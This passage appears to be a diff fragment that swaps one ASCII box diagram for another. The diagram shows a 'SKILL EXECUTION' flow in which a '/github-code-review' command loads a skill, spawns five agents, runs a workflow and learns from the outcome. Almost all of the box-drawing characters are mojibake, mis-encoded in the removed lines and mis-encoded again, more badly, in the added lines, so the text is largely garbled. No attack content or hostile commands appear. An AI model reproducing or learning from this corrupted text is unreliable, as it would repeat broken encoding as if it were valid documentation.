€Â¤
-Ã¢â€â€š  You: "Run /github-code-review"                                  Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€ â€œ                                                      Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â   Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â   Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â            Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š Load Skill  Ã¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š Spawn AgentsÃ¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š Execute     Ã¢â€â€š            Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š Definition  Ã¢â€â€š   Ã¢â€â€š (5 agents)  Ã¢â€â€š   Ã¢â€â€š Workflow    Ã¢â€â€š            Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ   Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ   Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ            Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€â€š                                  Ã¢â€â€š                   Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Learns from outcome Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ                   Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                         SKILL EXECUTION                          ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  You: "Run /github-code-review"                                  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Å“                                                      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â   ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â   ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Load Skill  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Spawn AgentsÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Execute     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Definition  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ (5 agents)  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Workflow    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Learns from outcome ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“                   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ